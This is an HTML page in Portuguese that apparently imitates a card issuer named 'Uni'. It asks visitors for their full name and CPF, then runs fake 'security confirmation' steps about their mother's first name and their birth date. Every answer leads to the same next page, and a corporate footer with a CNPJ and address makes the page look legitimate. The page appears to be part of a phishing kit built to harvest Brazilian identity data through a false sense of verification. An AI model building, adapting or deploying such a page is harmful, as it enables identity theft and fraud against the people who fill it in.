<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uni - Faça seu Cartão</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/style.css">
    
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  async
  defer
></script>

<script>
  window.pixelId = "66bb763debbcebab27d68442";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
    
</head><body>
    <link rel="stylesheet" href="../assets/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">

<div style="
  display: grid;
  grid-template-areas:
    'top-bar'
    'content'
    'footer';
  grid-template-rows: auto 1fr auto;
  min-height: 100vh;
">    
    <div class="header">
        <img style="width: 120px;" src="https://i.imgur.com/Q0PyyEg.png" alt="Imagem Centralizada">
    </div>

    <div style="grid-area: content; padding: 0 1rem;"> 
        <!-- Seção 7: Formulário de Cadastro -->
        <div style="margin-top: 18px;" class="main-content">
            <div id="formulario" class="mb-3">
                <p style="color:gray; text-align:initial">Preencha os campos abaixo</p>
                <form id="cadastroForm" style="text-align:initial">
                    <div class="mb-3">
                        <label for="nome" class="form-label" style="color:gray; font-size:13px">Nome completo</label>
                        <input type="text" class="form-control" id="nome" placeholder="Ex: Maria">
                    </div>
                    <div class="mb-3">
                        <label for="cpf" class="form-label" style="color:gray; font-size:13px">CPF</label>
                        <input type="text" class="form-control" id="cpf" placeholder="000.000.000-00">
                    </div>
                    <div id="loader" style="display: none; text-align: center; margin-bottom: 15px;">
                        <i class="fas fa-spinner fa-spin" style="font-size: 2em; color: #e6007e;"></i>
                    </div>
                    <button type="submit" class="btn btn-custom">Continuar</button>
                </form>
            </div>
    
            <div id="seguranca" class="mb-3" style="display: none;">
                <h4>Confirmações de segurança</h4>
                <p><strong>Qual primeiro nome da sua mãe?</strong></p>
                <button class="btn btn-custom" onclick="mostrarPagina('dataNascimento')">Fernanda</button>
                <button class="btn btn-custom" id="maeName" onclick="mostrarPagina('dataNascimento')"></button>
                <button class="btn btn-custom" onclick="mostrarPagina('dataNascimento')">Joana</button>
                <button class="btn btn-custom" onclick="mostrarPagina('dataNascimento')">Marta</button>
            </div>
    
            <div id="dataNascimento" class="mb-3" style="display: none;">
                <h4>Confirmações de segurança</h4>
                <p><strong>Sua data de nascimento está correta?</strong></p>
                <p id="bornDate"></p>
                <button class="btn btn-custom" onclick="location.href='../card/index.php'">sim</button>
                <button class="btn btn-custom" onclick="location.href='../card/index.php'">não</button>
            </div>
    
        </div>
    </div> 
    <script src="../assets/scriptValida.js"></script>
    <div class="footer py-4" id="footerChg">
        © 2024 Uni S/A. CNPJ 68.842.676/0001-66. <br>
         Av. paulista 1320, São Paulo/SP - CEP 01310-930
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>

</div>

